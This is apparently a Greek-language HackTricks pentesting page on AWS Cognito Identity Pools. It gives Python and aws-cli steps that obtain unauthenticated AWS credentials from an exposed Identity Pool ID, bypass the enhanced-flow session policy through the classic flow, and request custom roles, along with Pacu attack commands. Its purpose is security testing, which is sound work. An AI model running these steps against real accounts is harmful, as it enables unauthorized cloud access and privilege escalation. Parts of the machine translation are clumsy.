# Cognito Identity Pools

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

Οι πιστοποιητικές πισίνες εξυπηρετούν ένα κρίσιμο ρόλο επιτρέποντας στους χρήστες σας να **αποκτήσουν προσωρινές διαπιστευτήρια**. Αυτά τα διαπιστευτήρια είναι απαραίτητα για την πρόσβαση σε διάφορες υπηρεσίες του AWS, συμπεριλαμβανομένων, αλλά όχι περιοριστικά, των Amazon S3 και DynamoDB. Ένα χαρακτηριστικό των πιστοποιητικών πισίνων είναι η υποστήριξή τους τόσο για ανώνυμους επισκέπτες χρήστες όσο και για μια σειρά παρόχων ταυτότητας για την πιστοποίηση των χρηστών. Οι υποστηριζόμενοι πάροχοι ταυτότητας περιλαμβάνουν:

- Πισίνες χρηστών Amazon Cognito
- Επιλογές κοινωνικής σύνδεσης, όπως Facebook, Google, Login with Amazon και Sign in with Apple
- Πάροχοι που συμμορφώνονται με το OpenID Connect (OIDC)
- Πάροχοι ταυτότητας SAML (Security Assertion Markup Language)
- Πιστοποιημένες ταυτότητες αναπτυσσόμενων προγραμματιστών
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Για να δημιουργήσετε συνεδρίες Identity Pool, πρέπει πρώτα να **δημιουργήσετε ένα Identity ID**. Αυτό το Identity ID είναι η **ταυτοποίηση της συνεδρίας αυτού του χρήστη**. Αυτές οι ταυτοποιήσεις μπορούν να έχουν έως και 20 σύνολα δεδομένων που μπορούν να αποθηκεύσουν έως και 1MB από ζεύγη κλειδιού-τιμής.

Αυτό είναι **χρήσιμο για να κρατήσετε πληροφορίες ενός χρήστη** (ο οποίος θα χρησιμοποιεί πάντα το ίδιο Identity ID).

Επιπλέον, η υπηρεσία **cognito-sync** είναι η υπηρεσία που επιτρέπει να **διαχειρίζεστε και συγχρονίζετε αυτές τις πληροφορίες** (στα σύνολα δεδομένων, αποστέλλοντας πληροφορίες σε ροές και μηνύματα SNS...).

### Εργαλεία για pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), το πλαίσιο εκμετάλλευσης AWS, περιλαμβάνει τώρα τα αρθρώματα "cognito\_\_enum" και "cognito\_\_attack" που αυτοματοποιούν την απαρίθμηση όλων των πόρων Cognito σε έναν λογαριασμό και εντοπίζουν αδύναμες ρυθμίσεις, χαρακτηριστικά χρήστη που χρησιμοποιούνται για έλεγχο πρόσβασης, κ.λπ., και επίσης αυτοματοποιούν τη δημιουργία χρήστη (συμπεριλαμβανομένης της υποστήριξης MFA) και την ανέλιξη προνομιακών δικαιωμάτων βασιζόμενοι σε τροποποιήσιμα προσαρμοσμένα χαρακτηριστικά, δυνατές διαπιστευτήριες πρόσβασης στο identity pool, δυνατότητα ανάθεσης ρόλων σε αναγνωριστικά ταυτότητας, κ.λπ.

Για μια περιγραφή των λειτουργιών των αρθρωμάτων, δείτε το μέρος 2 του [blog post](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Για οδηγίες εγκατάστασης, δείτε την κύρια σελίδα του [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Χρήση

Παράδειγμα χρήσης του cognito\_\_attack για να προσπαθήσετε τη δημιουργία χρήστη και όλων των διανυσματικών προνομίων εναντίον ενός συγκεκριμένου identity pool και πελάτη πισίνας χρηστών:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Δείγμα χρήσης του cognito\_\_enum για να συγκεντρώσετε όλα τα user pools, user pool clients, identity pools, χρήστες κλπ. που είναι ορατά στον τρέχοντα λογαριασμό AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) είναι ένα εργαλείο γραμμής εντολών σε python που υλοποιεί διάφορες επιθέσεις στο Cognito, συμπεριλαμβανομένης της ανεπιθύμητης δημιουργίας λογαριασμού και της επέκτασης της πισίνας ταυτοτήτων.

#### Εγκατάσταση
```bash
$ pip install cognito-scanner
```
#### Χρήση
```bash
$ cognito-scanner --help
```
Για περισσότερες πληροφορίες ελέγξτε το https://github.com/padok-team/cognito-scanner

## Πρόσβαση σε ρόλους IAM

### Μη εξουσιοδοτημένη

Το μόνο πράγμα που χρειάζεται ένας επιτιθέμενος για να αποκτήσει διαπιστευτήρια AWS σε μια εφαρμογή Cognito ως μη εξουσιοδοτημένος χρήστης είναι το **Identity Pool ID**, και αυτό το **ID πρέπει να είναι καταχωρημένο** στην ιστοσελίδα/εφαρμογή για να το χρησιμοποιήσει. Ένα ID φαίνεται κάπως έτσι: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (δεν μπορεί να ανακαλυφθεί με βίαιο τρόπο).

{% hint style="success" %}
Ο **μη εξουσιοδοτημένος ρόλος IAM Cognito που δημιουργείται μέσω** αποκαλείται από προεπιλογή `Cognito_<Όνομα Identity Pool>Unauth_Role`
{% endhint %}

Αν βρείτε ένα Identity Pool ID που έχει καταχωρηθεί και επιτρέπει μη εξουσιοδοτημένους χρήστες, μπορείτε να αποκτήσετε διαπιστευτήρια AWS με:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ή μπορείτε να χρησιμοποιήσετε τις παρακάτω εντολές **aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Σημείωση ότι από προεπιλογή ένας μη εξουσιοδοτημένος χρήστης του Cognito **ΔΕΝ μπορεί να έχει καμία άδεια, ακόμη κι αν του έχει ανατεθεί μέσω πολιτικής**. Ελέγξτε την ακόλουθη ενότητα.
{% endhint %}

### Βελτιωμένη έναντι Βασικής διαδικασίας πιστοποίησης

Η προηγούμενη ενότητα ακολούθησε την **προεπιλεγμένη βελτιωμένη διαδικασία πιστοποίησης**. Αυτή η διαδικασία ορίζει μια **περιοριστική** [**πολιτική συνεδρίας**](../../aws-basic-information/#session-policies) για τη συνεδρία του ρόλου IAM που δημιουργήθηκε. Αυτή η πολιτική θα επιτρέπει μόνο στη συνεδρία να [**χρησιμοποιεί τις υπηρεσίες από αυτήν τη λίστα**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (ακόμη κι αν ο ρόλος είχε πρόσβαση σε άλλες υπηρεσίες).

Ωστόσο, υπάρχει ένας τρόπος να παρακάμψετε αυτό, αν η **Identity pool έχει ενεργοποιημένη τη "Βασική (Κλασική) Διαδικασία"**, ο χρήστης θα μπορεί να λάβει μια συνεδρία χρησιμοποιώντας αυτήν τη διαδικασία που **δεν θα έχει αυτήν την περιοριστική πολιτική συνεδρίας**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Εάν λάβετε αυτό το **σφάλμα**, σημαίνει ότι η **βασική ροή δεν είναι ενεργοποιημένη (προεπιλογή)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Έχοντας ένα σύνολο διαπιστευτηρίων IAM, θα πρέπει να ελέγξετε [ποια πρόσβαση έχετε](../../#whoami) και να προσπαθήσετε να [αναβαθμίσετε τα δικαιώματα](../../aws-privilege-escalation/).

### Επαληθευμένος

{% hint style="info" %}
Θυμηθείτε ότι οι **επαληθευμένοι χρήστες** πιθανόν να έχουν **διαφορετικές άδειες**, οπότε εάν μπορείτε να **εγγραφείτε στην εφαρμογή**, δοκιμάστε να το κάνετε και να λάβετε τα νέα διαπιστευτήρια.
{% endhint %}

Ενδέχεται επίσης να υπάρχουν **ρόλοι** διαθέσιμοι για **επαληθευμένους χρήστες που έχουν πρόσβαση στο Identity Pool**.

Για αυτό μπορεί να χρειαστεί να έχετε πρόσβαση στον **πάροχο ταυτότητας**. Εάν αυτός είναι ένας **Cognito User Pool**, ίσως μπορείτε να καταχραστείτε την προεπιλεγμένη συμπεριφορά και να **δημιουργήσετε ένα νέο χρήστη μόνοι σας**.

{% hint style="success" %}
Ο **ρόλος IAM Cognito που δημιουργείται μέσω επαλήθευσης** ονομάζεται από προεπιλογή `Cognito_<Identity Pool name>Auth_Role`
{% endhint %}

Πάντως, το **παρακάτω παράδειγμα** υποθέτει ότι έχετε ήδη συνδεθεί σε ένα **Cognito User Pool** που χρησιμοποιείται για την πρόσβαση στο Identity Pool (μην ξεχάσετε ότι μπορεί να έχουν διαμορφωθεί και άλλοι τύποι παρόχων ταυτότητας).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Πάρτε το identity_id από την προηγούμενη απάντηση της εντολής
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# Στο IdToken μπορείτε να βρείτε τους ρόλους στους οποίους έχει πρόσβαση ένας χρήστης λόγω των ομάδων του User Pool
# Χρησιμοποιήστε το --custom-role-arn για να λάβετε διαπιστευτήρια για έναν συγκεκριμένο ρόλο
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Είναι δυνατόν να **διαμορφώσετε διαφορετικούς ρόλους IAM ανάλογα με τον πάροχο ταυτότητας** στον οποίο συνδέεται ο χρήστης ή ακόμα και απλά **ανάλογα με τον χρήστη** (χρησιμοποιώντας διεκδικήσεις). Επομένως, εάν έχετε πρόσβαση σε διάφορους χρήστες μέσω του ίδιου ή διαφορετικού παρόχου, μπορεί να αξίζει να συνδεθείτε και να έχετε πρόσβαση στους ρόλους IAM όλων τους.
{% endhint %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
